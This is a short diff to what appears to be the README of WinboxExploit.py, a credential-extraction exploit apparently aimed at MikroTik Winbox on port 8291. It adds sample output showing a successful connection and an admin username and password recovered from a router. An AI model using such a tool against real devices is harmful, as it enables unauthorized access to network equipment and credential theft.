@@ -20,7 +20,8 @@ python3 WinboxExploit.py <ip-address> (port)
 Example:
 ```
 $ python3 WinboxExploit.py 172.17.17.17
-
+Connected to 172.17.17.17:8291
+Exploit successful
 User: admin
 Pass: Th3P4ssWord
 ```
